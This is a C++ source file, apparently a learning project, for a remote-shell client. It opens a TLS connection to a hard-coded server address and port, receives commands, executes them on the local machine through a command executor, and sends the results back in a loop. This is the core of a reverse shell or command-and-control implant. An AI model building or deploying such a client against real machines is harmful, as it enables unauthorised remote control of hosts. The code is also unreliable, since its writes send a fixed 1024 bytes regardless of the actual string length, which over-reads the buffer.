#include "client.hpp"
#include "client_info.hpp"
#include "command.hpp"
#include "command_executor.hpp"
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <vector>

#define SERVER_ADDRESS "127.0.0.1"
#define SERVER_PORT 3000
#define MAX_PAYLOAD_SIZE 1024
#define JSON_CLIENT_INFO_PATH "../client.json"

void test_client_info();
bool run_command(command &command_struct, string &cmd_result);
int main();

bool run_command(command &command_struct, string &cmd_result) {
  command_executor cmd_executor(cmd_result);
  if (strcmp(command_struct.get_command_name(), "exit") == 0) {
    return false;
  }
  if (strcmp(command_struct.get_command_name(), "cd") == 0) {
    chdir(command_struct.get_arguments().at(0).c_str());
    return true;
  }
  cmd_executor.execute(command_struct.get_full_command());
  return true;
}

void test_client_info() {
  client_info user_info("../client.json");
  printf("%s\n", user_info.get_client_name());
}

int main() {
  char received_payload[MAX_PAYLOAD_SIZE] = {0};
  string cmd_result;
  vector<string> command_args;
  client_info user_info(JSON_CLIENT_INFO_PATH);
  SSL_library_init();
  SSL_CTX *ssl_ctx = SSL_CTX_new(TLSv1_2_client_method());
  SSL *ssl;
  telnet_client client(SERVER_ADDRESS, SERVER_PORT);
  if (!client.connect_to_target()) {
    printf("Failed connecting to target\n");
    SSL_CTX_free(ssl_ctx);
    return -1;
  }
  ssl = SSL_new(ssl_ctx);
  SSL_set_fd(ssl, client.get_client_socket());
  if (SSL_connect(ssl) != 1) {
    printf("Failed TLS handshake\n");
    SSL_free(ssl);
    client.close_connection();
    SSL_CTX_free(ssl_ctx);
    return -1;
  }
  printf("Successed connecting to target\n");
  while (true) {
    memset(received_payload, 0, MAX_PAYLOAD_SIZE);
    cmd_result.clear();
    command_args.clear();
    if (SSL_read(ssl, received_payload, MAX_PAYLOAD_SIZE) < 0) {
      printf("Connection lost\n");
      break;
    }
    // debug
    printf("server -> %s\n", received_payload);

    command command_struct(received_payload, command_args);
    if (!run_command(command_struct, cmd_result)) {
      SSL_write(ssl, "connection closed", MAX_PAYLOAD_SIZE);
      break;
    }
    SSL_write(ssl, cmd_result.c_str(), MAX_PAYLOAD_SIZE);
  }
  SSL_shutdown(ssl);
  SSL_free(ssl);
  SSL_CTX_free(ssl_ctx);
  client.close_connection();
  return 0;
}
